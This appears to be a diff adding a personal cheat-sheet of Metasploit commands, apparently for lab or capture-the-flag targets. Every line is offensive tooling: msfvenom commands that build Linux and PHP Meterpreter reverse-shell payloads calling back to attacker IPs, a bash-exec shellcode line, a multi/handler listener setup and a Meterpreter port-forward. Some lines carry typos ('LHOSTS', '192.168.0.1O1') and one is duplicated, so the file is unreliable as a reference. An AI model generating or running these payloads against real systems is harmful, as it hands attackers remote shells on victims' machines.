@@ -1,0 +1,13 @@
+
+msfvenom -p linux/x86/exec CMD=/bin/bash -f python -b '\x00'  
+msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.56.1 lport=5555 -f elf > imf-meterpreter
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOSTS=192.168.0.1O1 LPORT=4445 -b "\x00\x0a\x0d" -f python
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOSTS=192.168.0.1O1 LPORT=4445 -b "\x00\x0a\x0d" -f python
+msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.56.1 LPORT=5555 -f raw > violator_msfvenom.php
+use exploit/multi/handler
+set LHOST 192.168.110.103
+set LPORT 5555 
+run
+meterpreter > portfwd add -l 7788 -p 7788 -r 127.0.0.1
+portfwd add -l 7788 -p 7788 -r 127.0.0.1
